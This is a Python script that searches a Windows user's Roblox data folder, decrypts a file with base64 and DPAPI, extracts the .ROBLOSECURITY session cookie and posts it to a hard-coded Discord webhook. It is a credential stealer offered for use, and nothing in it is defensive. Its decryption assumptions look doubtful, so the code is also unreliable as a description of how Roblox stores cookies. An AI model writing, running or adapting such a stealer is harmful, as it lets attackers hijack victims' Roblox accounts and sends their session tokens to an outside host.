import os
import base64
import win32crypt
import requests
import json

# Your Discord webhook URL
WEBHOOK_URL = "https://discord.com/api/webhooks/1416965460498452543/SlZvtmFrYpt34Wcpzg35-8y3BkUXqK6VMT7NkSFE1o86MaQv4HxYWOp0lxkWZoeoAjP1"

def extract_roblox_cookie():
    # Path to Roblox's local data (Windows)
    roblox_path = os.path.expanduser(r"~\AppData\Local\Roblox")
    cookie_file = None

    # Search for cookies file (e.g., GlobalBasicSettings or cookies.dat)
    for root, _, files in os.walk(roblox_path):
        for file in files:
            if "GlobalBasicSettings" in file or file.endswith(".dat"):
                cookie_file = os.path.join(root, file)
                break
        if cookie_file:
            break

    if not cookie_file:
        return None, "Could not find Roblox cookies file"

    try:
        with open(cookie_file, 'rb') as f:
            data = f.read()

        # Decode and decrypt (assumes base64 + DPAPI encryption)
        decoded = base64.b64decode(data)
        decrypted_data = win32crypt.CryptUnprotectData(decoded, None, None, None, 0)[1]

        # Parse for .ROBLOSECURITY
        cookie_value = None
        for line in decrypted_data.decode('utf-8', errors='ignore').split('\n'):
            if ".ROBLOSECURITY" in line:
                cookie_value = line.split('=')[1].strip()
                break

        if cookie_value:
            return cookie_value, None
        return None, "Cookie not found in file"
    except Exception as e:
        return None, f"Error extracting cookie: {str(e)}"

def send_to_webhook(cookie, error=None):
    payload = {
        "content": f"**Roblox Cookie**: {cookie}" if cookie else f"**Error**: {error}"
    }
    try:
        response = requests.post(WEBHOOK_URL, json=payload)
        if response.status_code != 204:
            return f"Failed to send to webhook: {response.status_code} - {response.text}"
        return None
    except Exception as e:
        return f"Webhook error: {str(e)}"

def main():
    cookie, error = extract_roblox_cookie()
    error_message = None
    if cookie:
        error_message = send_to_webhook(cookie)
    else:
        error_message = send_to_webhook(None, error)
    
    # If there's an error, write it to a log file
    if error_message:
        with open("cookie_error.log", "w") as f:
            f.write(error_message)

if __name__ == "__main__":
    main()